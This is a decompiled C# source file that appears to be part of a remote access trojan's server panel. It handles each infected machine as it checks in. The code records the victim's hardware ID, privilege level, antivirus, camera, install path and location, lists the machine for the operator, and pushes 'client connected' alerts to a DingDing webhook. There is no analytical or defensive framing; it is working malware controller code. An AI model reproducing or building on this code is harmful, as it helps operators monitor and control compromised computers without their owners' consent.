using System;
using System.Drawing;
using System.Media;
using System.Windows.Forms;
using IP2Region;
using Server.Connection;
using Server.Helper;
using Server.MessagePack;
using Server.Properties;

namespace Server.Handle_Packet
{
	// Token: 0x02000083 RID: 131
	public class HandleListView
	{
		// Token: 0x06000430 RID: 1072 RVA: 0x000279D0 File Offset: 0x00025BD0
		public void AddToListview(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				object lockBlocked = Settings.LockBlocked;
				lock (lockBlocked)
				{
					try
					{
						if (Settings.Blocked.Count > 0)
						{
							if (Settings.Blocked.Contains(unpack_msgpack.ForcePathObject("HWID").AsString))
							{
								client.Disconnected();
								return;
							}
							if (Settings.Blocked.Contains(client.Ip))
							{
								client.Disconnected();
								return;
							}
						}
					}
					catch
					{
					}
				}
				client.Admin = false;
				if (unpack_msgpack.ForcePathObject("Admin").AsString.ToLower() != "user")
				{
					client.Admin = true;
				}
				client.LV = new ListViewItem
				{
					Tag = client,
					Text = string.Format("{0}:{1}", client.Ip, client.TcpClient.LocalEndPoint.ToString().Split(new char[]
					{
						':'
					})[1])
				};
				string text = "";
				try
				{
					if (TimeZoneInfo.Local.Id == "China Standard Time")
					{
						using (DbSearcher dbSearcher = new DbSearcher(Environment.CurrentDirectory + "\\Plugins\\ip2region.db"))
						{
							string region = dbSearcher.MemorySearch(client.TcpClient.RemoteEndPoint.ToString().Split(new char[]
							{
								':'
							})[0]).Region;
							for (int i = 0; i < 5; i++)
							{
								if (i != 1 && (region.Split(new char[]
								{
									'|'
								})[i] != "" || region.Split(new char[]
								{
									'|'
								})[i] != " "))
								{
									text = text + region.Split(new char[]
									{
										'|'
									})[i] + " ";
								}
							}
						}
						client.LV.SubItems.Add(text);
					}
					else
					{
						string[] array = Program.form1.cGeoMain.GetIpInf(client.TcpClient.RemoteEndPoint.ToString().Split(new char[]
						{
							':'
						})[0]).Split(new char[]
						{
							':'
						});
						client.LV.SubItems.Add(array[1]);
					}
				}
				catch
				{
					client.LV.SubItems.Add("Unknown");
				}
				client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Group").AsString);
				client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
				client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
				client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Camera").AsString);
				client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
				client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Version").AsString);
				try
				{
					client.LV.SubItems.Add(Convert.ToDateTime(unpack_msgpack.ForcePathObject("Install_ed").AsString).ToLocalTime().ToString());
				}
				catch
				{
					try
					{
						client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Install_ed").AsString);
					}
					catch
					{
						client.LV.SubItems.Add("??");
					}
				}
				client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Admin").AsString);
				client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Anti_virus").AsString);
				client.LV.SubItems.Add("0000 MS");
				client.LV.SubItems.Add("...");
				client.LV.ToolTipText = "[Path] " + unpack_msgpack.ForcePathObject("Path").AsString + Environment.NewLine;
				ListViewItem lv = client.LV;
				lv.ToolTipText = lv.ToolTipText + "[Paste_bin] " + unpack_msgpack.ForcePathObject("Paste_bin").AsString;
				client.ID = unpack_msgpack.ForcePathObject("HWID").AsString;
				client.LV.UseItemStyleForSubItems = false;
				client.LastPing = DateTime.Now;
				Program.form1.Invoke(new MethodInvoker(delegate()
				{
					object lockListviewClients = Settings.LockListviewClients;
					lock (lockListviewClients)
					{
						Program.form1.listView1.Items.Add(client.LV);
						Program.form1.listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
						Program.form1.lv_act.Width = 429;
					}
					if (Settings.Default.Notification)
					{
						Program.form1.notifyIcon1.BalloonTipText = "Connected \n" + client.Ip + " : " + client.TcpClient.LocalEndPoint.ToString().Split(new char[]
						{
							':'
						})[1];
						Program.form1.notifyIcon1.ShowBalloonTip(100);
						if (Settings.Default.DingDing && Settings.Default.WebHook != null && Settings.Default.Secret != null)
						{
							try
							{
								string content = string.Concat(new string[]
								{
									"Client ",
									client.Ip,
									" connected\nGroup:",
									unpack_msgpack.ForcePathObject("Group").AsString,
									"\nUser:",
									unpack_msgpack.ForcePathObject("User").AsString,
									"\nOS:",
									unpack_msgpack.ForcePathObject("OS").AsString,
									"\nUser:",
									unpack_msgpack.ForcePathObject("Admin").AsString
								});
								DingDing.Send(Settings.Default.WebHook, Settings.Default.Secret, content);
							}
							catch (Exception ex)
							{
								MessageBox.Show(ex.Message);
							}
						}
					}
					new HandleLogs().Addmsg("Client " + client.Ip + " connected", Color.Green);
					if (TimeZoneInfo.Local.Id == "China Standard Time" && Settings.Default.Notification)
					{
						SoundPlayer soundPlayer = new SoundPlayer(Resources.online);
						soundPlayer.Load();
						soundPlayer.Play();
					}
				}));
			}
			catch
			{
			}
		}

		// Token: 0x06000431 RID: 1073 RVA: 0x00028038 File Offset: 0x00026238
		public void Received(Clients client)
		{
			try
			{
				object lockListviewClients = Settings.LockListviewClients;
				lock (lockListviewClients)
				{
					if (client.LV != null)
					{
						client.LV.ForeColor = Color.Gainsboro;
					}
				}
			}
			catch
			{
			}
		}
	}
}
